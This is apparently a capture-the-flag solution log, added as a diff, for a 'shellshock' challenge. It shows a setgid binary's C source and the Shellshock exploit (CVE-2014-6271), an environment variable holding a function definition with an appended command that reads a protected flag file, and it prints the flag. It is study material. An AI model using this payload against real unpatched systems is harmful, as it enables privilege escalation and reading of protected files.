@@ -1,0 +1,26 @@
+shellshock@ubuntu:~$ ls -alt
+total 976
+dr-xr-xr-x 61 root root          4096 Mar  7 02:28 ..
+-r-xr-sr-x  1 root shellshock2   8547 Oct 12  2014 shellshock
+drwxr-x---  4 root shellshock    4096 Oct 12  2014 .
+-rw-r-----  1 root shellshock     188 Oct 12  2014 shellshock.c
+dr-xr-xr-x  2 root root          4096 Oct 12  2014 .irssi
+-r--r-----  1 root shellshock2     47 Oct 12  2014 flag
+d---------  2 root root          4096 Oct 12  2014 .bash_history
+-r-xr-xr-x  1 root shellshock2 959120 Oct 12  2014 bash
+shellshock@ubuntu:~$ cat shellshock.c
+#include <stdio.h>
+int main(){
+        setresuid(getegid(), getegid(), getegid());
+        setresgid(getegid(), getegid(), getegid());
+        system("/home/shellshock/bash -c 'echo shock_me'");
+        return 0;
+}
+
+shellshock@ubuntu:~$ ./shellshock
+shock_me
+shellshock@ubuntu:~$ env x='() { :;}; /bin/cat flag' bash -c "./shellshock"
+only if I knew CVE-2014-6271 ten years ago..!!
+Segmentation fault
+shellshock@ubuntu:~$
+
